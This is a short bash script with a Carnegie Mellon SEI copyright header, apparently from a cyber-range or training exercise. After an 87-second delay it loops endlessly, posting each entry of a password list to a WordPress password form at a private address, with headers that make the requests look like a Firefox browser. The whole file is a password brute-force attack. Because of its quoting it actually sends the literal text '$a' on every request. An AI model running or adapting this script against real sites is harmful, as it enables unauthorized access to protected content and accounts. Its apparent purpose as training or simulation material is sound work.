#!/bin/bash

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


sleep 87

while true
do
while read -r a; do
curl 'http://10.1.1.20/wp-login.php?action=postpass' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.1.1.20' -H 'Connection: keep-alive' -H 'Referer: http://10.1.1.20/employee-directory/' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'post_password=$a&Submit=Enter'
done < /etc/systemd/system/passwordlist.txt
done
